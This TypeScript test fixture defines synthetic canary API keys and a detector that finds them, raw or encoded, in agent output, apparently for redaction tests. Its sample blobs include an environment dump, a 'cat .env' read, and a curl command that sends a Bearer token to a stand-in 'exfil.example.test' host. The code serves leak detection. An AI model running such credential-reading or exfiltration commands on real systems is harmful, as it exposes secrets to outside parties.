/**
 * Synthetic canary secrets for redaction tests (ISSUE 3). None of these is a real credential: every value carries the
 * KWCANARY marker and a fixed made-up tail. `findCanaryLeaks` looks for the tails raw and in the encodings an agent
 * could plausibly emit, so a partially redacted value still counts as a leak.
 */
const ANT_TAIL = "Zq7Xv2Lp9Rt4Wm8Nc3Bf6Hd1Jk5Gs0Ya";
const OAI_TAIL = "proj9f8e7d6c5b4a3210ZYXWVUTSRQ";
const GH_TAIL = "KWCANARY0aB1cD2eF3gH4iJ5kL6mN7oP8qR9s";

export const CANARY = {
  anthropic: `sk-ant-oat01-KWCANARY-${ANT_TAIL}`,
  openai: `sk-KWCANARY-${OAI_TAIL}`,
  github: `ghp_${GH_TAIL}`,
} as const;

const b64 = (s: string) => Buffer.from(s, "utf8").toString("base64");
const hex = (s: string) => Buffer.from(s, "utf8").toString("hex");

export const ENCODED = {
  base64Anthropic: b64(CANARY.anthropic),
  hexOpenai: hex(CANARY.openai),
  urlEncodedQuery: encodeURIComponent(`token=${CANARY.github}&x=1`),
};

/** Text blobs a real run could produce, each carrying canaries in a different shape. */
export const CANARY_TEXT = {
  envDump: [
    "HOME=/home/agent",
    `ANTHROPIC_API_KEY=${CANARY.anthropic}`,
    `GITHUB_TOKEN=${CANARY.github}`,
    "LANG=C.UTF-8",
    `OPENAI_API_KEY=${CANARY.openai}`,
    "PATH=/usr/local/bin:/usr/bin",
  ].join("\n"),
  commandOutput: `$ cat .env\nDB_HOST=localhost\nAPI_KEY="${CANARY.openai}"\n`,
  multilineLog: `INFO start\nDEBUG auth header: Authorization: Bearer ${CANARY.openai}\nINFO done`,
  jsonEscaped: JSON.stringify(JSON.stringify({ headers: { "x-api-key": CANARY.anthropic } })),
  bashCommand: `curl -s -H 'x-api-key: ${CANARY.anthropic}' https://api.example.test/v1/messages`,
  base64: `echo ${ENCODED.base64Anthropic} | base64 -d > /tmp/k`,
  hex: `printf %s 0x${ENCODED.hexOpenai}`,
  urlEncoded: `GET /oauth/cb?state=${ENCODED.urlEncodedQuery}`,
  argv: ["/usr/bin/curl", "-H", `Authorization: Bearer ${CANARY.github}`, "https://exfil.example.test"],
};

/** Names of the canary forms found in `text` (empty = no leak). */
export function findCanaryLeaks(text: string): string[] {
  const hits: string[] = [];
  const probes: Record<string, string[]> = {
    raw_tail: [ANT_TAIL, OAI_TAIL, GH_TAIL],
    raw_tail_fragment: [ANT_TAIL.slice(0, 12), ANT_TAIL.slice(-12), OAI_TAIL.slice(0, 12), OAI_TAIL.slice(-12), GH_TAIL.slice(8, 22)],
    base64: Object.values(CANARY).map((c) => b64(c).slice(8, 36)),
    hex: Object.values(CANARY).map((c) => hex(c).slice(24, 80)),
    url_encoded: [ENCODED.urlEncodedQuery.slice(10, 40)],
  };
  for (const [form, needles] of Object.entries(probes)) if (needles.some((n) => text.includes(n))) hits.push(form);
  if (text.includes("KWCANARY-") || text.includes("KWCANARY0")) hits.push("marker");
  return hits;
}
